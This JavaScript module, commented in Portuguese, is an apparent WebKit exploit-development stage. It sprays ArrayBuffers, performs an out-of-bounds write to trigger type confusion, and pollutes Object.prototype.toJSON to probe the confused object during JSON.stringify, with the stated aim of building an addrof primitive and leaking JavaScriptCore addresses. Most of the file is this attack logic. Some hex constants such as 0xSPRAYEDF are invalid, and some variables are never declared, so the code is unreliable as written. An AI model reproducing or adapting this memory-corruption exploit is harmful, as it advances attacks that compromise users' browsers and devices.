// js/script3/testArrayBufferVictimCrash.mjs (R43L - Spray AB + TC Read As ABV)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_SprayAB_TCReadABV";

const SPRAY_SIZE = 256; // Número de ArrayBuffers no spray
const SPRAY_AB_SIZE = 64; // Tamanho de cada ArrayBuffer no spray
const VICTIM_TA_SIZE_ELEMENTS = 8; // Para o TypedArray que vai no JSON.stringify

const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB; // Causa TC

const PROBE_CALL_LIMIT_V82 = 10;

// Offsets WebKitLeak (mantidos para quando addrof for obtido)
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak_spray_ab; // A função cujo endereço queremos
let sprayed_abs = []; // Array para manter os ArrayBuffers do spray vivos
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value);
}
function logTypedArrayContentShort(ta, name = "TypedArray", maxElements = 4) { /* ... (sem alteração) ... */
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, maxElements))).map(v => `0x${(v >>> 0).toString(16)}`);
    return `[${content.join(", ")}${ta.length > maxElements ? "..." : ""}] (len:${ta.length})`;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Spray AB + TC Read As ABV ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init SprayAB...`;

    targetFunctionForLeak_spray_ab = function someUniqueLeakFunctionR43L_SprayAB() { return `target_R43L_SprayAB_${Date.now()}`; };

    logS3(`--- Fase 0 (SprayAB): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (SprayAB): Não iniciado.", /*...*/ },
        webkit_leak_result: { success: false, msg: "WebKit Leak (SprayAB): Não iniciado." },
        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        spray_read_analysis: null
    };
    
    // 1. Spray de Memória
    sprayed_abs = [];
    logS3(`   Iniciando Spray de ${SPRAY_SIZE} ArrayBuffers (tamanho ${SPRAY_AB_SIZE} bytes cada)...`, 'info');
    for (let i = 0; i < SPRAY_SIZE; i++) {
        let ab = new ArrayBuffer(SPRAY_AB_SIZE);
        let u32_view = new Uint32Array(ab);
        u32_view[0] = 0xSPRAYEDF + i; // ID Único
        u32_view[1] = 0xBEEFBEEF;     // Padrão
        // No último AB do spray, colocar o targetFunctionForLeak (ou uma referência a ele)
        // Isso é altamente especulativo. A forma de fazer isso sem um addrof é difícil.
        // Por enquanto, apenas preencher com padrões.
        if (i === SPRAY_SIZE -1) { // Exemplo: colocar um valor diferente no último
            u32_view[2] = 0xLASTABBA;
        }
        sprayed_abs.push(ab);
    }
    logS3(`   Spray concluído.`, 'info');
    await PAUSE_S3(200); // Pausa para estabilizar a memória após o spray


    let victim_ta_for_json_trigger = null;
    let m1_ref_for_sondar = null;
    let m2_object_for_sondar = null;

    let spray_read_analysis_details = {
        notes: "Não executado",
        this_is_arraybufferview: false,
        this_buffer_content: null,
        this_length: null,
        this_property_0: null,
        addrof_via_spray_success: false,
        leaked_address_str: null
    };

    let probe_call_count_iter = 0;
    let iteration_tc_first_detection_done = false;
    let heisenbugConfirmedThisIter = false;

    function toJSON_TA_Probe_Iter_Closure_SprayAB() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_ta_for_json_trigger) {
                logS3(`[PROBE_SprayAB] Call #${call_num}: 'this' é victim_ta_for_json_trigger. Configurando M1/M2...`, "debug");
                m2_object_for_sondar = { id: "M2_SPRAY_TARGET" };
                m1_ref_for_sondar = { marker_id_spray_ab: "M1_SprayAB", payload_M2_obj: m2_object_for_sondar };
                return m1_ref_for_sondar;

            } else if (is_m2c) { // `this` é m2_object_for_sondar
                if (!iteration_tc_first_detection_done) {
                    iteration_tc_first_detection_done = true;
                    heisenbugConfirmedThisIter = true;
                    result_for_runner.tc_probe_details = { /* ... */ this_is_M2: true, notes: "TC Confirmada. 'this' é m2_object_for_sondar."};
                    logS3(`[PROBE_SprayAB] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");

                    spray_read_analysis_details.notes = "TC ocorreu. Analisando 'this' como possível ArrayBufferView...";
                    
                    // Tentar acessar 'this' como se fosse um ArrayBufferView
                    try {
                        if (this.buffer && this.buffer instanceof ArrayBuffer) {
                            spray_read_analysis_details.this_is_arraybufferview = true;
                            logS3(`   !!! 'this.buffer' existe e é um ArrayBuffer! Tamanho: ${this.buffer.byteLength} !!!`, "success_major");
                            let temp_u32_view = new Uint32Array(this.buffer);
                            spray_read_analysis_details.this_buffer_content = logTypedArrayContentShort(temp_u32_view, "'this.buffer' (via TC)");
                            
                            // Se o conteúdo corresponder a um dos nossos ABs do spray...
                            if (temp_u32_view.length > 0 && (temp_u32_view[0] >>> 0) >= 0xSPRAYEDF00 && (temp_u32_view[0] >>> 0) <= (0xSPRAYEDF00 + SPRAY_SIZE)) {
                                spray_read_analysis_details.notes += " 'this.buffer' parece ser um dos ArrayBuffers do spray!";
                                logS3(`   !!! CONTEÚDO DE 'this.buffer' (${safeToHex(temp_u32_view[0])}) PARECE SER DE UM ArrayBuffer DO SPRAY !!!`, "success_major");
                                // Se this.buffer[1] contivesse targetFunctionForLeak_spray_ab (ou seu endereço), seria addrof.
                                // Por enquanto, apenas logar.
                                if (temp_u32_view.length > 1) {
                                     logS3(`       this.buffer[1] = ${safeToHex(temp_u32_view[1])}`, "leak");
                                     // Aqui poderíamos tentar uma lógica de addrof se soubéssemos que o objeto foi escrito aqui
                                }
                            }
                        } else {
                             logS3(`   'this.buffer' não é um ArrayBuffer ou não existe.`, "info");
                        }

                        if (typeof this.length === 'number') {
                            spray_read_analysis_details.this_length = this.length;
                            logS3(`   'this.length' existe: ${this.length}`, "leak_detail");
                        }

                        // Tentar ler this[0] pode dar erro se 'this' não for indexável.
                        if (this[0] !== undefined) { // Leitura especulativa
                            spray_read_analysis_details.this_property_0 = String(this[0]);
                            logS3(`   'this[0]' existe: ${safeToHex(this[0])}`, "leak_detail");
                        }

                    } catch (e_read_this) {
                        spray_read_analysis_details.notes += ` Erro ao tentar ler 'this' como ABV: ${e_read_this.message}`;
                        logS3(`   Erro ao tentar ler 'this' como ArrayBufferView: ${e_read_this.message}`, "error");
                    }
                }
                return this;
            }
        } catch (e_pm) { /* ... */ }
        return { gen_m: call_num, type: ctts };
    }

    let iter_primary_error = null;
    // ...

    try {
        victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
        logS3(`   victim_ta_for_json_trigger criado. Length: ${victim_ta_for_json_trigger.length}`, "info");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150);

        logS3(`  --- Tentativa de Detecção de TC e Leitura de Spray (SprayAB) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try { /* ... (lógica da sonda TC) ... */
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_SprayAB, writable: true, configurable: true, enumerable: false });
            polluted = true;
            iter_raw_stringify_output = JSON.stringify(victim_ta_for_json_trigger);
            try { result_for_runner.stringifyResult = JSON.parse(iter_raw_stringify_output); } catch (e_p) { /*...*/ }
            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = heisenbugConfirmedThisIter;
            if (heisenbugConfirmedThisIter) { logS3(`  TC Probe (SprayAB): TC CONFIRMADA.`, "vuln"); }
            else { logS3(`  TC Probe (SprayAB): TC NÃO Confirmada.`, "warn"); }
        } catch (e_str) { /*...*/ } finally { /*...*/ }
        
        result_for_runner.spray_read_analysis = spray_read_analysis_details;
        if (spray_read_analysis_details.this_is_arraybufferview) {
             logS3(`  Análise de Spray: 'this' pareceu ser um ArrayBufferView. Conteúdo do buffer: ${spray_read_analysis_details.this_buffer_content}`, "success_major");
        } else {
             logS3(`  Análise de Spray: 'this' não se comportou como ArrayBufferView. Notas: ${spray_read_analysis_details.notes}`, "info");
        }
        
        logS3(`  --- Fase de TC e Leitura de Spray Concluída. TC: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_TEST_BASE);

    } catch (e_outer_iter) { /*...*/ } finally { /*...*/ }

    final_probe_call_count_for_report = probe_call_count_iter;
    result_for_runner.total_probe_calls_last_iter = final_probe_call_count_for_report;
    result_for_runner.iteration_results_summary = [{ /* ... (sumário da única iteração) ... */
        oob_value: safeToHex(OOB_WRITE_VALUE_FOR_TC), error: result_for_runner.errorOccurred,
        tc_probe_details: result_for_runner.tc_probe_details, stringifyResult: result_for_runner.stringifyResult,
        addrof_result_this_iter: result_for_runner.addrof_result, webkit_leak_result_this_iter: result_for_runner.webkit_leak_result,
        heisenbug_on_M2_confirmed_by_tc_probe: result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        spray_read_analysis: result_for_runner.spray_read_analysis
    }];
    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC);
    result_for_runner.heisenbug_on_M2_in_best_result = result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe;

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (SprayAB): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (result_for_runner.spray_read_analysis?.this_is_arraybufferview) {
        final_title_status = "TC read 'this' as ABV!";
        if (result_for_runner.spray_read_analysis.notes.includes("SPRAY")) {
             final_title_status = "TC read SPRAYED ABV!";
        }
    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, No ABV Read";
    } else if (result_for_runner.errorOccurred) { /*...*/ }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return result_for_runner;
}
